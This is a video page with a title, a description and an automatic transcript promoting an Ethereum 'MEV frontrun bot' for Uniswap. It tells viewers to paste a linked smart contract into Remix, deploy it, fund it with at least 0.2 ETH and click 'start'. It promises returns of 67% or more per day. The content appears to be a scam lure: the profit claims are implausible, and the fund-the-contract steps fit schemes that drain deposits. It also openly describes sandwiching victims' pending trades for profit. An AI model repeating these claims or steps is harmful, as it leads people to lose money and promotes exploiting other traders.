title: How to Make 67%+/DAY With an MEV Ethereum Uniswap Bot - ETH Sniper Bot Tutorial
description: #bot #swap #bitcoin  Everyone in cryptocurrency NEEDS to know about MEV arbitrage bots. Using Maximal Extractable Value (MEV) technology, bots like this are able to sniff the mempool for pending transactions on decentralized exchanges such as Uniswap. The bot inserts our own transaction with a slightly higher gas fee, 1 Gwei higher than the transaction which is trying to be entered. This essentially sandwiches the pending transaction and forces ours to be processed first, consequently profiting off of the slippage difference.  :check mark button:Updated Code: Working as of July 13, 2023 (Thanks you guys Steven and Tim from Telegram, for giving me feedback on your Bots, I've just updated the source code to the Bot for running more smoothly. )   *** STEP BY STEP INSTRUCTIONS ***  1. Download MetaMask:  2. Access Remix  3. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol"  4. Paste SmartContract in Remix:   5. Move to the "Solidity Compiler" tab, select version "0.6.6" and then "Compile" it  6. Move to the "Deploy" tab, select "Injected Web 3" environment and then "Deploy" it. After the transaction is confirmed, it's your own BOT now  7. Deposit funds (at least 0.2 ETH to prevent negating slippage) to your exact contract/bot address  8. After your transaction is confirmed, start the bot by clicking the 'start' button. Withdraw anytime by clicking 'withdrawal'  :police car light:EDIT: I got messages from people who didn't fund the contract enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. Ifyou fund the contract with 0.2 ETH or less and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit. I recommend funding the contract with at least 0.2 ETH just to make sure that won't happen.

asr.full_text: Hello guys, I want to share with you the Uniswap smart contract bot I recently developed that can finally help you quit your job and make very easy passive income as we all deserve the equal chance for generational wealth. In a few words, Frontrun bot allows you to automatically trade a given token over the Ethereum mainnet without having to go through the typical transactional methods. This is going to enable us to frontrun transactions on tokens on decentralized finance exchanges such as Uniswap. This is going to allow us to sniff the mempool, or basically look for transactions that are pending to be made within a block. And it's going to allow us to inject our transaction with a higher gas fee, one GUI higher than the transaction which is trying to be entered. This will allow our transaction to be processed first, and then we will also process a sell order within the same block. So, essentially, the victim's transaction gets sandwiched between ours and we make a profit after slippage difference in the transaction. To start off, make sure you have MetaMask installed and connected to Mainnet so we go to REMIXETHEREUMCOMPILER.GHUBYO. Remix is an application allowing us to develop deploy compile and launch smart contracts which are coded in the solidity language you can find the link in the description below head over to the sidebar on the left and create a new contract under contracts folder we're going to name it botsol. So next if you look at the description I'll have included a link to a text file. Let's copy and paste that code. This is our frontrunner bot contract that I've created. A couple of items to look at here is the lines 50 and 51. If you followed on the Frontrunner bot contract that I've created. Couple of items to look at here is the lines 50 and 51. If you follow those addresses on Etherscan, you will see that these are the addresses of wrappedether token. We'll be competing with them. Yep, as you can see, it's the official wrappedether address. Wish all that were mine. So let's get back to Remix. Now that we have our BOTS SOL file ready, let's compile it. Click here. As you see, it's built with 0.6.6 version of Solidity.
